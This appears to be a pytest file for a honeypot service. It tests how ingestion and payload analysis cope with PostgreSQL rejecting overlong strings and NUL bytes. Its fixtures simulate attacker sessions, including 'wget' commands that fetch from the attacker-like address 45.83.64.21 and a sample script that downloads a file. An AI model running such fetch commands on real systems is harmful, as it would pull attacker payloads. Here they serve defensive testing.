"""Behaviour only PostgreSQL has.

The suite runs on SQLite, which ignores VARCHAR lengths and stores a NUL in
JSON without complaint. Both defects fixed here (a session resent for ever,
a sample re-analysed for ever) were invisible to it. These tests need a real
PostgreSQL and are skipped unless TEST_DATABASE_URL names one:

    TEST_DATABASE_URL=postgresql+asyncpg://postgres:postgres@localhost:5432/hs_test \\
        python -m pytest tests -q -m postgres

The database is the suite's to use: tables are created and dropped in it.
"""

import base64
import hashlib
import os

import pytest
from sqlalchemy import insert, select
from sqlalchemy.exc import DBAPIError

from app.core.dberrors import is_data_error
from app.models import (
    HoneypotNode,
    HoneypotSession,
    IndicatorOfCompromise,
    PayloadSample,
)
from app.services import payload_enrichment

pytestmark = pytest.mark.postgres

SHARED = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}
INGEST = "/api/v1/sessions/ingest-internal"


async def _node(session):
    node = HoneypotNode(name="pg-node", protocol="ssh", ip_address="10.0.0.9", port=2222)
    session.add(node)
    await session.commit()
    return node


async def _stored_session(session, node):
    row = HoneypotSession(node_id=node.id, protocol="ssh", attacker_ip="45.83.64.20")
    session.add(row)
    await session.commit()
    return row


# --- what PostgreSQL itself refuses (the premise of the fixes) -------------------

async def test_postgres_refuses_an_overlong_varchar(pg_session):
    """Written past the ORM, so the model's own length guard is not in play."""
    node = await _node(pg_session)
    stored = await _stored_session(pg_session, node)
    with pytest.raises(DBAPIError) as raised:
        await pg_session.execute(
            insert(IndicatorOfCompromise.__table__).values(
                session_id=stored.id, ioc_type="url", value="http://45.83.64.21/" + "a" * 600
            )
        )
    await pg_session.rollback()
    assert is_data_error(raised.value)


async def test_postgres_refuses_a_nul_in_jsonb(pg_session):
    with pytest.raises(DBAPIError) as raised:
        await pg_session.execute(
            insert(PayloadSample.__table__).values(
                sha256="b" * 64, sha1="", md5="", size=1,
                analysis_status="complete", analysis_attempts=0,
                analysis={"summary": "a NUL \x00 here"},
            )
        )
    await pg_session.rollback()
    assert is_data_error(raised.value)


# --- item 7: ingest ------------------------------------------------------------------

async def test_session_with_an_overlong_url_is_stored(pg_client, pg_session):
    """This exact payload was answered 500 and resent by the engine for ever."""
    node = await _node(pg_session)
    long_url = "http://45.83.64.21/" + "a" * 900
    response = await pg_client.post(
        f"{INGEST}?node_id={node.id}", headers=SHARED,
        json={
            "protocol": "ssh", "attacker_ip": "45.83.64.20",
            "commands": [f"wget {long_url}", "id"],
            "events": [{"event_type": "file_download", "url": long_url,
                        "host": "h" * 900, "filename": "f" * 900}],
        },
    )
    assert response.status_code == 200, response.text
    values = (await pg_session.execute(select(IndicatorOfCompromise.value))).scalars().all()
    assert values and all(len(v) <= 500 for v in values)


async def test_session_full_of_nuls_and_broken_unicode_is_stored(pg_client, pg_session):
    node = await _node(pg_session)
    response = await pg_client.post(
        f"{INGEST}?node_id={node.id}", headers=SHARED,
        json={
            "protocol": "http", "attacker_ip": "45.83.64.20",
            "commands": ["GET /\x00\x16\x03\x01 HTTP/1.1", "half a pair \ud83d"],
            "transcript": [{"command": "\x00", "output": "\x00\ud800", "exit_code": 0, "timestamp": 1.0}],
            "events": [{"event_type": "http_diversion", "reason": "probe\x00"}],
            "fingerprints": {"ja3": "abc\x00"},
        },
    )
    assert response.status_code == 200, response.text
    stored = (await pg_session.execute(select(HoneypotSession))).scalar_one()
    assert "\x00" not in str(stored.network_events)


async def test_a_value_postgres_refuses_is_answered_422_not_500(pg_client, pg_session, monkeypatch):
    """Whatever slips past the guards must still not look like an outage."""
    from app.api import sessions as sessions_api

    node = await _node(pg_session)
    stored = await _stored_session(pg_session, node)

    async def write_past_the_guards(db, session_data, node_id):
        await db.execute(
            insert(IndicatorOfCompromise.__table__).values(
                session_id=stored.id, ioc_type="url", value="u" * 600
            )
        )
        await db.commit()

    monkeypatch.setattr(sessions_api.analysis_pipeline, "process_session", write_past_the_guards)
    response = await pg_client.post(
        f"{INGEST}?node_id={node.id}", headers=SHARED,
        json={"protocol": "ssh", "attacker_ip": "45.83.64.20", "commands": ["id"]},
    )
    assert response.status_code == 422, response.text
    # The session was rolled back cleanly and is usable for the next request.
    assert (await pg_session.execute(select(IndicatorOfCompromise))).first() is None


async def test_overlong_node_name_is_refused_at_registration(pg_client, pg_session):
    response = await pg_client.post(
        "/api/v1/nodes/register-internal", headers=SHARED,
        json={"name": "n" * 300, "protocol": "multi", "ip_address": "0.0.0.0", "port": 2222},
    )
    assert response.status_code == 422


# --- item 4: payload reports ----------------------------------------------------------

async def _pending_sample(pg_client, pg_session):
    node = await _node(pg_session)
    content = b"#!/bin/sh\necho hi\n"
    upload = {
        "filename": "a.sh", "sha256": hashlib.sha256(content).hexdigest(), "size": len(content),
        "source": "ssh_shell", "content_b64": base64.b64encode(content).decode(),
    }
    response = await pg_client.post(
        f"{INGEST}?node_id={node.id}", headers=SHARED,
        json={"protocol": "ssh", "attacker_ip": "45.83.64.20", "commands": ["id"], "uploads": [upload]},
    )
    assert response.status_code == 200, response.text
    return (await pg_session.execute(select(PayloadSample))).scalar_one()


async def test_report_with_nuls_and_an_overlong_label_is_saved(pg_client, pg_session, monkeypatch):
    """JSONB refused the NUL, VARCHAR(128) the label; the commit failed, the
    sample stayed pending, and it was analysed again every hour."""
    sample = await _pending_sample(pg_client, pg_session)

    async def hostile_report(content, timeout, memory_mb):
        return {
            "status": "complete",
            "report": {
                "analyser_version": "1" * 40,
                "file_kind": "script" * 20,
                "file_type": {"label": "A" * 5000 + " script"},
                "family": {"family": "F" * 500},
                "summary": "a NUL \x00 and half a pair \ud800",
                "strings\x00": ["\x00"],
                "indicators": {"urls": [{"value": "http://45.83.64.21/" + "a" * 900}]},
                "indicator_count": 1,
            },
        }

    monkeypatch.setattr(payload_enrichment.sandbox, "run", hostile_report)
    await payload_enrichment.analyse_sample(pg_session, sample.id)
    await pg_session.refresh(sample)

    assert sample.analysis_status == "complete"
    assert sample.analysis_attempts == 1
    assert len(sample.file_type) <= 128 and len(sample.family) <= 64 and len(sample.file_kind) <= 32
    assert "\\x00" in sample.analysis["summary"]  # escaped, still visible


async def test_real_analysis_of_a_long_shebang_is_saved(pg_client, pg_session):
    """End to end through the real analyser and sandbox."""
    node = await _node(pg_session)
    content = b"#!/usr/bin/" + b"A" * 3000 + b"\nwget http://45.83.64.21/x\n"
    upload = {
        "filename": "x", "sha256": hashlib.sha256(content).hexdigest(), "size": len(content),
        "source": "ssh_shell", "content_b64": base64.b64encode(content).decode(),
    }
    await pg_client.post(
        f"{INGEST}?node_id={node.id}", headers=SHARED,
        json={"protocol": "ssh", "attacker_ip": "45.83.64.20", "commands": ["id"], "uploads": [upload]},
    )
    sample = (await pg_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(pg_session, sample.id)
    await pg_session.refresh(sample)
    assert sample.analysis_status == "complete", sample.analysis_error


async def test_unstorable_result_is_given_up_on_after_a_few_attempts(pg_client, pg_session, monkeypatch):
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "PAYLOAD_ANALYSIS_MAX_ATTEMPTS", 2)
    sample = await _pending_sample(pg_client, pg_session)

    async def report(content, timeout, memory_mb):
        return {"status": "complete", "report": {"file_kind": "script", "indicators": {}}}

    def store_something_postgres_refuses(sample_row, raw_report):
        # Past the sanitiser on purpose: a real rejection by the database.
        sample_row.analysis = {"summary": "\x00"}
        sample_row.analysis_status = "complete"
        return {"indicators": {}}

    monkeypatch.setattr(payload_enrichment.sandbox, "run", report)
    monkeypatch.setattr(payload_enrichment, "_store_report", store_something_postgres_refuses)

    await payload_enrichment.analyse_sample(pg_session, sample.id)
    await pg_session.refresh(sample)
    assert (sample.analysis_status, sample.analysis_attempts) == ("pending", 1)

    await payload_enrichment.analyse_sample(pg_session, sample.id)
    await pg_session.refresh(sample)
    assert (sample.analysis_status, sample.analysis_attempts) == ("failed", 2)
    assert "could not be stored" in sample.analysis_error
